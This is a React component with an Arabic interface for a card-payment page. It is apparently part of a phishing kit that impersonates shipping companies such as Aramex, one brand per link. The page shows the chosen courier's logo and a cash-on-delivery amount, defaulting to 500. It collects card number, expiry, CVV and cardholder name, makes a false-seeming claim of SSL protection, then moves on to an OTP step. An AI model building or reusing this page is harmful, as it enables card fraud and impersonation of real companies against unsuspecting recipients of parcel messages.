import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { useLink } from "@/hooks/useSupabase";
import { CreditCard, Lock, ArrowLeft, Check } from "lucide-react";
import { useTheme } from "@/themes/ThemeContext";

const PaymentCardInputOfficial = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData } = useLink(id);
  const { theme } = useTheme();

  const serviceKey = linkData?.payload?.service_key || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const shippingInfo = linkData?.payload as any;

  const [cardNumber, setCardNumber] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [cvv, setCvv] = useState("");
  const [cardholderName, setCardholderName] = useState("");
  const [errors, setErrors] = useState<Record<string, string>>({});

  // Get amount from shipping info
  const rawAmount = shippingInfo?.cod_amount || 500;
  const amount = typeof rawAmount === 'string' ? parseFloat(rawAmount) : rawAmount;

  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
    const matches = v.match(/\d{4,16}/g);
    const match = matches && matches[0] || "";
    const parts = [];

    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4));
    }

    if (parts.length) {
      return parts.join(" ");
    } else {
      return v;
    }
  };

  const formatExpiryDate = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
    if (v.length >= 2) {
      return `${v.substring(0, 2)}/${v.substring(2, 4)}`;
    }
    return v;
  };

  const validateForm = () => {
    const newErrors: Record<string, string> = {};

    if (!cardNumber || cardNumber.replace(/\s/g, "").length < 16) {
      newErrors.cardNumber = "يرجى إدخال رقم بطاقة صحيح";
    }

    if (!expiryDate || expiryDate.length < 5) {
      newErrors.expiryDate = "يرجى إدخال تاريخ انتهاء صالح";
    }

    if (!cvv || cvv.length < 3) {
      newErrors.cvv = "يرجى إدخال CVV صحيح";
    }

    if (!cardholderName.trim()) {
      newErrors.cardholderName = "يرجى إدخال اسم حامل البطاقة";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    if (validateForm()) {
      navigate(`/pay/${id}/otp`);
    }
  };

  const handleBack = () => {
    navigate(`/pay/${id}/details`);
  };

  return (
    <div
      className="min-h-screen"
      style={{
        background: 'var(--color-background)',
        fontFamily: 'var(--font-family)',
      }}
    >
      {/* Official Company Header */}
      <header
        className="sticky top-0 z-50 w-full border-b"
        style={{
          backgroundColor: 'var(--color-surface)',
          borderBottomColor: 'var(--color-border)',
          height: 'var(--header-height)',
          padding: 'var(--header-padding)',
          boxShadow: 'var(--header-box-shadow)',
        }}
      >
        <div className="container mx-auto h-full flex items-center justify-between">
          <div className="flex items-center gap-3 sm:gap-4">
            <button onClick={handleBack} className="p-2 hover:bg-gray-100 rounded-full transition-colors">
              <ArrowLeft className="w-5 h-5" style={{ color: 'var(--color-text)' }} />
            </button>
            <img
              src={theme?.logo}
              alt={serviceName}
              className="h-8 sm:h-12 w-auto object-contain"
            />
          </div>
          <div className="text-right">
            <h1 className="text-lg sm:text-xl font-bold" style={{ color: 'var(--color-text)' }}>
              {serviceName}
            </h1>
            <p className="text-xs sm:text-sm" style={{ color: 'var(--color-text-secondary)' }}>
              أدخل بيانات البطاقة
            </p>
          </div>
        </div>
        {/* Brand Bar */}
        <div
          className="h-1 w-full"
          style={{
            background: 'var(--gradient)',
          }}
        />
      </header>

      {/* Main Content */}
      <main className="container mx-auto px-4 py-6 sm:py-8">
        <div className="max-w-2xl mx-auto">
          {/* Progress Indicator */}
          <div
            className="mb-6 sm:mb-8 p-4 sm:p-6 rounded-lg border"
            style={{
              backgroundColor: 'var(--color-surface)',
              borderColor: 'var(--color-border)',
            }}
          >
            <div className="flex items-center justify-between mb-3">
              <span
                className="text-sm font-semibold"
                style={{ color: 'var(--color-text)' }}
              >
                الخطوة 3 من 4
              </span>
              <span
                className="text-xs"
                style={{ color: 'var(--color-text-secondary)' }}
              >
                {serviceName}
              </span>
            </div>
            <div className="w-full h-2 bg-gray-200 rounded-full overflow-hidden">
              <div
                className="h-full rounded-full transition-all duration-500"
                style={{
                  width: '75%',
                  background: 'var(--gradient)',
                }}
              />
            </div>
          </div>

          {/* Card Form */}
          <form onSubmit={handleSubmit}>
            <div
              className="border rounded-xl p-6 sm:p-8 mb-6"
              style={{
                backgroundColor: 'var(--color-surface)',
                borderColor: 'var(--color-border)',
                borderRadius: 'var(--card-border-radius)',
                padding: 'var(--card-padding)',
                border: 'var(--card-border)',
              }}
            >
              <h2
                className="text-xl font-bold mb-2"
                style={{ color: 'var(--color-text)' }}
              >
                أدخل بيانات البطاقة
              </h2>
              <p
                className="text-sm mb-6"
                style={{ color: 'var(--color-text-secondary)' }}
              >
                معلوماتك محمية ومشفرة
              </p>

              <div className="space-y-5">
                {/* Card Number */}
                <div>
                  <label
                    className="block text-sm font-semibold mb-2"
                    style={{ color: 'var(--color-text)' }}
                  >
                    رقم البطاقة
                  </label>
                  <div className="relative">
                    <input
                      type="text"
                      placeholder="1234 5678 9012 3456"
                      value={cardNumber}
                      onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
                      maxLength={19}
                      className="w-full px-4 py-3 border rounded-lg text-sm transition-all focus:outline-none focus:ring-2"
                      style={{
                        borderColor: errors.cardNumber ? '#E31837' : 'var(--color-border)',
                        fontFamily: 'var(--font-family)',
                        '--tw-ring-color': 'var(--color-primary)',
                      } as React.CSSProperties}
                    />
                    <CreditCard
                      className="absolute left-3 top-1/2 -translate-y-1/2 w-5 h-5"
                      style={{ color: 'var(--color-text-secondary)' }}
                    />
                    {cardNumber.length === 19 && !errors.cardNumber && (
                      <Check className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5" style={{ color: '#00A651' }} />
                    )}
                  </div>
                  {errors.cardNumber && (
                    <p className="text-xs mt-1" style={{ color: '#E31837' }}>
                      {errors.cardNumber}
                    </p>
                  )}
                </div>

                {/* Expiry and CVV */}
                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <label
                      className="block text-sm font-semibold mb-2"
                      style={{ color: 'var(--color-text)' }}
                    >
                      تاريخ الانتهاء
                    </label>
                    <input
                      type="text"
                      placeholder="MM/YY"
                      value={expiryDate}
                      onChange={(e) => setExpiryDate(formatExpiryDate(e.target.value))}
                      maxLength={5}
                      className="w-full px-4 py-3 border rounded-lg text-sm transition-all focus:outline-none focus:ring-2"
                      style={{
                        borderColor: errors.expiryDate ? '#E31837' : 'var(--color-border)',
                        fontFamily: 'var(--font-family)',
                        '--tw-ring-color': 'var(--color-primary)',
                      } as React.CSSProperties}
                    />
                    {errors.expiryDate && (
                      <p className="text-xs mt-1" style={{ color: '#E31837' }}>
                        {errors.expiryDate}
                      </p>
                    )}
                  </div>

                  <div>
                    <label
                      className="block text-sm font-semibold mb-2"
                      style={{ color: 'var(--color-text)' }}
                    >
                      CVV
                    </label>
                    <div className="relative">
                      <input
                        type="password"
                        placeholder="***"
                        value={cvv}
                        onChange={(e) => setCvv(e.target.value.replace(/[^0-9]/g, ""))}
                        maxLength={4}
                        className="w-full px-4 py-3 border rounded-lg text-sm transition-all focus:outline-none focus:ring-2"
                        style={{
                          borderColor: errors.cvv ? '#E31837' : 'var(--color-border)',
                          fontFamily: 'var(--font-family)',
                          '--tw-ring-color': 'var(--color-primary)',
                        } as React.CSSProperties}
                      />
                      <Lock
                        className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4"
                        style={{ color: 'var(--color-text-secondary)' }}
                      />
                    </div>
                    {errors.cvv && (
                      <p className="text-xs mt-1" style={{ color: '#E31837' }}>
                        {errors.cvv}
                      </p>
                    )}
                  </div>
                </div>

                {/* Cardholder Name */}
                <div>
                  <label
                    className="block text-sm font-semibold mb-2"
                    style={{ color: 'var(--color-text)' }}
                  >
                    اسم حامل البطاقة
                  </label>
                  <input
                    type="text"
                    placeholder="الاسم كما يظهر على البطاقة"
                    value={cardholderName}
                    onChange={(e) => setCardholderName(e.target.value)}
                    className="w-full px-4 py-3 border rounded-lg text-sm transition-all focus:outline-none focus:ring-2"
                    style={{
                      borderColor: errors.cardholderName ? '#E31837' : 'var(--color-border)',
                      fontFamily: 'var(--font-family)',
                      '--tw-ring-color': 'var(--color-primary)',
                    } as React.CSSProperties}
                  />
                  {errors.cardholderName && (
                    <p className="text-xs mt-1" style={{ color: '#E31837' }}>
                      {errors.cardholderName}
                    </p>
                  )}
                </div>

                {/* Security Notice */}
                <div
                  className="flex items-center gap-3 p-4 rounded-lg border"
                  style={{
                    backgroundColor: `rgba(var(--color-primary-rgb), 0.08)`,
                    borderColor: `rgba(var(--color-primary-rgb), 0.3)`,
                  }}
                >
                  <Lock className="w-5 h-5 flex-shrink-0" style={{ color: '#00A651' }} />
                  <span className="text-xs" style={{ color: 'var(--color-text)' }}>
                    جميع المعلومات محمية بتشفير SSL 256-bit
                  </span>
                </div>
              </div>
            </div>

            {/* Submit Button */}
            <button
              type="submit"
              className="w-full text-white font-bold py-4 sm:py-5 px-6 rounded-lg transition-all duration-300 hover:shadow-lg active:scale-[0.98] flex items-center justify-center gap-2 text-sm sm:text-base"
              style={{
                background: 'var(--gradient)',
                padding: 'var(--button-padding)',
                borderRadius: 'var(--button-border-radius)',
                fontWeight: 'var(--button-font-weight)',
                textTransform: 'var(--button-text-transform)',
                fontFamily: 'var(--font-family)',
              }}
            >
              <span>تأكيد والدفع</span>
              <ArrowLeft className="w-5 h-5" />
            </button>
          </form>
        </div>
      </main>
    </div>
  );
};

export default PaymentCardInputOfficial;
